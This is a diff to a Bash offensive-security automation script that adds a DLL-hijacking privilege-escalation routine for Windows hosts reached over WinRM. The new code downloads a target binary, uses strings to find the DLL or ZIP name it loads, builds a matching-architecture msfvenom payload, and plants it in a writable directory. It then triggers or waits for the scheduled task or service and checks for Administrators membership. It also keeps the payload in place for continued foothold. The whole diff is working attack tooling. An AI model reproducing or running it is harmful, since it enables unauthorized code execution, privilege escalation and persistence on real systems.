@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.45.1"
+readonly VERSION="1.46.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2684,6 +2684,20 @@ _winrm_service_creds() {
 _winrm_put() { _winrm_exec "upload \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
 _winrm_get() { _winrm_exec "download \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
 
+# PE architecture of a downloaded binary → we must build the payload DLL to match (an
+# x64 DLL won't load into a 32-bit process and vice-versa).
+_pe_arch() {
+    python3 - "$1" <<'PY' 2>/dev/null
+import sys
+try:
+    import pefile
+    pe = pefile.PE(sys.argv[1], fast_load=True)
+    print('x64' if pe.FILE_HEADER.Machine == 0x8664 else 'x86')
+except Exception:
+    print('x64')
+PY
+}
+
 # Pick a hijackable imported DLL from a downloaded PE: an import that is NOT a Windows
 # KnownDLL / system module, so the loader resolves it from the application directory
 # FIRST (DLL search order) — exactly the slot a writable app dir lets us occupy.
@@ -2791,37 +2805,68 @@ _hijack_one() {
         _winrm_put "$tmp/p.exe" "$writ"
         loot "  ${C_RED}★ Hijack: replaced writable binary '$writ' with a payload (task '$name' as ${runas:-?})${C_RESET}"
     else
-        # Writable DIRECTORY → classic DLL search-order hijack: find a non-system DLL the
-        # binary imports and plant it here (the app dir is searched before system32).
+        # Writable DIRECTORY → DLL hijack. Download the binary and LIGHT-REVERSE it with
+        # `strings`: custom loaders read a named DLL — or extract one from a named ZIP —
+        # from their own dir (the filename is baked into the binary). Discover and plant
+        # exactly that, with the matching architecture, instead of guessing.
         mode="dll"
         _winrm_get "$execp" "$tmp/bin.exe"
-        [[ ! -s "$tmp/bin.exe" ]] && { warn "  Hijack: could not download '$execp' to find a hijackable DLL → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
-        local dll; dll=$(_hijackable_dll "$tmp/bin.exe")
-        [[ -z "$dll" ]] && { warn "  Hijack: '$execp' imports no clearly non-system DLL to hijack → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
-        planted="${writ%\\}\\${dll}"
-        msfvenom -p windows/x64/exec EXITFUNC=thread CMD="cmd /c $wincmd" -f dll -o "$tmp/p.dll" >/dev/null 2>&1
-        _winrm_put "$tmp/p.dll" "$planted"
-        loot "  ${C_RED}★ DLL hijack: planted '$dll' in writable load dir '$writ' (binary '$execp', task '$name' as ${runas:-?})${C_RESET}"
+        [[ ! -s "$tmp/bin.exe" ]] && { warn "  Hijack: could not download '$execp' to inspect it → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
+        local arch mp; arch=$(_pe_arch "$tmp/bin.exe"); mp="windows/x64/exec"; [[ "$arch" == "x86" ]] && mp="windows/exec"
+        local refzip refdll
+        refzip=$(strings -a "$tmp/bin.exe" 2>/dev/null | grep -aoiE '[A-Za-z0-9_.-]+\.zip' | grep -aviE '^(api-ms|ext-ms)' | head -1)
+        refdll=$(strings -a "$tmp/bin.exe" 2>/dev/null | grep -aoiE '[A-Za-z0-9_.-]+\.dll' | grep -aviE 'msvc|vcruntime|ucrtbase|kernel|ntdll|^api-ms|^ext-ms|^d3d|mscoree|clr|system\.' | head -1)
+        if [[ -n "$refzip" ]]; then
+            # DLL-in-ZIP loader: build the DLL, zip it under the name the binary expects,
+            # and plant the ZIP in the writable dir (the binary extracts + loads it).
+            mode="zip"; have zip || { warn "  Hijack: 'zip' missing → cannot build the loader archive → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
+            local innerdll="${refdll:-update.dll}"
+            msfvenom -p "$mp" EXITFUNC=thread CMD="cmd /c $wincmd" -f dll -o "$tmp/$innerdll" >/dev/null 2>&1
+            ( cd "$tmp" && zip -q "$refzip" "$innerdll" )
+            planted="${writ%\\}\\${refzip}"
+            _winrm_put "$tmp/$refzip" "$planted"
+            loot "  ${C_RED}★ DLL-in-ZIP hijack: planted '$refzip' (contains '$innerdll', $arch) in '$writ' — '$execp' extracts+loads it (task '$name' as ${runas:-?})${C_RESET}"
+        else
+            # Classic DLL search-order: plant a DLL the binary imports / references.
+            local dll; dll=$(_hijackable_dll "$tmp/bin.exe"); [[ -z "$dll" ]] && dll="$refdll"
+            [[ -z "$dll" ]] && { warn "  Hijack: '$execp' references no hijackable DLL → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
+            planted="${writ%\\}\\${dll}"
+            msfvenom -p "$mp" EXITFUNC=thread CMD="cmd /c $wincmd" -f dll -o "$tmp/p.dll" >/dev/null 2>&1
+            _winrm_put "$tmp/p.dll" "$planted"
+            loot "  ${C_RED}★ DLL hijack: planted '$dll' ($arch) in writable load dir '$writ' (binary '$execp', task '$name' as ${runas:-?})${C_RESET}"
+        fi
     fi
     rb_record "Hijack ${mode} for $kind '$name' (planted: $planted)" \
               "evil-winrm … then: Remove-Item '$planted'  ;  if exists Move-Item -Force '${backup:-<none>}' '$planted'"
 
-    # ---- TRIGGER ----------------------------------------------------------------
+    # ---- TRIGGER (best effort — a task running as ANOTHER user usually can't be run by
+    # us; that's fine, most of these fire on a short schedule, so we WAIT for it) -------
     local trig=""
     if [[ "$kind" == "TASK" ]]; then
-        trig=$(_winrm_exec "schtasks /Run /TN \"$name\" 2>&1; Start-Sleep -Seconds 4" 2>&1)
+        trig=$(_winrm_exec "schtasks /Run /TN \"$name\" 2>&1" 2>&1)
     else
-        trig=$(_winrm_exec "Restart-Service -Name \"$name\" -ErrorAction SilentlyContinue 2>&1; (sc.exe stop \"$name\"; Start-Sleep 1; sc.exe start \"$name\") 2>&1; Start-Sleep -Seconds 4" 2>&1)
+        trig=$(_winrm_exec "Restart-Service -Name \"$name\" -ErrorAction SilentlyContinue 2>&1; (sc.exe stop \"$name\"; Start-Sleep 1; sc.exe start \"$name\") 2>&1" 2>&1)
     fi
     printf '%s\n' "$trig" >>"$LOGFILE"
-    if grep -qiE 'access is denied|ERROR:|does not have permission|cannot open' <<<"$trig" && ! grep -qiE 'SUCCESS|has been started' <<<"$trig"; then
-        warn "  Hijack: could NOT trigger $kind '$name' ourselves (access denied) — payload is planted; it fires on its next scheduled run. Playbook:"
+    local self_trig=0; grep -qiE 'SUCCESS|has been started|attempted to run' <<<"$trig" && self_trig=1
+    [[ "$self_trig" != "1" ]] && info "  Can't run $kind '$name' ourselves (runs as ${runas:-another user}) — waiting for its own schedule to fire the payload (Ctrl-C to skip)…"
+
+    # ---- WAIT for execution: poll the whoami marker the payload writes. Covers BOTH our
+    # own trigger and the task's natural schedule (often every few minutes). -----------
+    local who="" waited=0 step=15 maxw="${HIJACK_WAIT:-240}"
+    while (( waited <= maxw )); do
+        who=$(_winrm_exec "Get-Content \"$marker\" -ErrorAction SilentlyContinue" 2>&1 | tr -d '\r' | grep -iE '\\\\|@' | head -1)
+        [[ -n "$who" ]] && break
+        sleep "$step"; waited=$((waited+step))
+    done
+    if [[ -n "$who" ]]; then
+        loot "  ${C_GREEN}Hijack payload executed AS: ${C_BOLD}${who}${C_RESET} ${C_DIM}(after ~${waited}s)${C_RESET}"
+    else
+        warn "  Hijack: planted but no execution seen within ${maxw}s — it should still fire on its next run. Playbook:"
         _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"
     fi
 
-    # ---- VERIFY: read the whoami drop + check our admin membership --------------
-    local who; who=$(_winrm_exec "Get-Content \"$marker\" -ErrorAction SilentlyContinue" 2>&1 | tr -d '\r' | grep -iE '\\\\|@' | head -1)
-    [[ -n "$who" ]] && loot "  ${C_GREEN}Hijack payload executed AS: ${C_BOLD}${who}${C_RESET}"
+    # ---- VERIFY: did we land in Administrators? --------------------------------------
     local mem; mem=$(_winrm_exec "net localgroup administrators 2>&1" 2>&1 | tr -d '\r')
     local won=0
     grep -qiE "(^|\\\\)${USER}(\$|[^A-Za-z0-9])" <<<"$mem" && won=1
@@ -2845,13 +2890,19 @@ _hijack_one() {
         fi
     fi
 
-    # ---- ROLLBACK ---------------------------------------------------------------
-    if [[ "$mode" == "script" || "$mode" == "exe" ]]; then
-        _winrm_exec "if (Test-Path \"$backup\") { Move-Item -Force \"$backup\" \"$planted\" }" >>"$LOGFILE" 2>&1
+    # ---- ROLLBACK: clean up when we're done (escalated) or it never fired. But if we
+    # got code-exec as ANOTHER non-admin user, LEAVE the payload so you can keep using
+    # that foothold (e.g. pivot the runner's group rights) — it's rollback-tracked.
+    if [[ "$won" == "1" || -z "$who" ]]; then
+        if [[ "$mode" == "script" || "$mode" == "exe" ]]; then
+            _winrm_exec "if (Test-Path \"$backup\") { Move-Item -Force \"$backup\" \"$planted\" }" >>"$LOGFILE" 2>&1
+        else
+            _winrm_exec "Remove-Item -Force \"$planted\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
+        fi
+        _winrm_exec "Remove-Item -Force \"$marker\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
     else
-        _winrm_exec "Remove-Item -Force \"$planted\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
+        warn "  Left the hijack payload in place so you can keep code-exec as '${who}' — clean up when done: Remove-Item '$planted'"
     fi
-    _winrm_exec "Remove-Item -Force \"$marker\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
     rm -rf "$tmp"
     [[ "$won" == "1" ]] && return 0 || return 1
 }
